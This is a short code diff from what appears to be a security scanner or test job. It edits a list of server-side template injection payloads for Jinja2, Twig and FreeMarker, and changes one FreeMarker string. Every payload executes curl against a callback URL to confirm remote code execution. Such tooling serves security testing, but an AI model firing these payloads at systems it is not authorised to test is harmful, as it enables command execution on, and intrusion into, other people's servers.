@@ -100,7 +100,7 @@ jobs:
             payloads.extend([
                 ("ssti-jinja2", "{{" + f"config.__class__.__init__.__globals__['os'].popen('curl {callback_url}').read()" + "}}"),
                 ("ssti-twig", "{{" + f"'/usr/bin/curl'|filter('exec','{callback_url}')" + "}}"),
-                ("ssti-freemarker", f'${{" freemarker.template.utility.Execute"?new()("curl {callback_url}")}}'),
+                ("ssti-freemarker", f'{{" freemarker.template.utility.Execute"?new()("curl {callback_url}")}}'),
             ])
 
         client = get_http_client(timeout=10)
